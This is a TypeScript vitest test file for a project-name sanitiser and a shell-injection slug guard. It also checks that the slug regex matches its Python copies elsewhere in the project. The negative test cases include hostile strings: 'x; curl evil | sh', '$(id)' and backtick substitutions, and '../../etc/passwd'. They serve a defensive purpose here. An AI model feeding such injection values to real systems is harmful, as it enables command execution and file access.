import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { SLUG_RE, assertValidSlug, sanitizeProjectName } from "../src/core/projects";

describe("sanitizeProjectName", () => {
  it("slugifies a friendly name", () => {
    expect(sanitizeProjectName("My First Website!")).toBe("my-first-website");
  });

  it("rejects empty / whitespace-only names", () => {
    expect(() => sanitizeProjectName("   ")).toThrow();
    expect(() => sanitizeProjectName("")).toThrow();
  });

  it("neutralises path traversal and separators (no escaping the Workspace)", () => {
    expect(sanitizeProjectName("../../etc/passwd")).not.toContain("..");
    expect(sanitizeProjectName("../../etc/passwd")).not.toContain("/");
    expect(sanitizeProjectName("a/b/c")).toBe("a-b-c");
  });
});

describe("assertValidSlug (Box-side shell-injection guard)", () => {
  it("accepts the shape sanitizeProjectName produces", () => {
    expect(assertValidSlug("my-first-website")).toBe("my-first-website");
    expect(assertValidSlug(sanitizeProjectName("Guessing Game 2"))).toBe("guessing-game-2");
  });

  it("rejects anything carrying shell metacharacters or path parts", () => {
    for (const bad of ['x; curl evil | sh', "a/b", "../etc", "a b", "a$(id)", "a`id`", "", "-lead", "UP"]) {
      expect(() => assertValidSlug(bad)).toThrow(/Unsafe Project slug/);
    }
  });
});

describe("the slug shape's three copies", () => {
  // The slug is the name that gets interpolated into Box-side shell commands and
  // resolved into Workspace paths, so the Box has to enforce the same shape the
  // Launcher does — in Python, where it cannot import SLUG_RE. Both semantics are
  // tested on their own side (above, and box/terminal/test_paths.py); nothing but
  // this checks the three patterns are the SAME pattern. A slack copy in the Box
  // accepts a name the Launcher would never produce.
  const boxFile = (...parts: string[]) =>
    readFileSync(join(__dirname, "..", "..", "box", ...parts), "utf8");

  /** The pattern of a `SLUG_RE = re.compile(r"…")` in a Python source file. */
  function pythonSlugPattern(source: string, where: string): string {
    const found = source.match(/_?SLUG_RE\s*=\s*re\.compile\(r"([^"]+)"\)/);
    expect(found, `${where} no longer compiles a SLUG_RE`).not.toBeNull();
    return found![1];
  }

  it("box/bin/claudebox-session guards the slug with core/projects.ts's regex", () => {
    expect(pythonSlugPattern(boxFile("bin", "claudebox-session"), "claudebox-session")).toBe(
      SLUG_RE.source,
    );
  });

  it("box/terminal/paths.py rejects the same slugs core/projects.ts does", () => {
    expect(pythonSlugPattern(boxFile("terminal", "paths.py"), "paths.py")).toBe(SLUG_RE.source);
  });
});
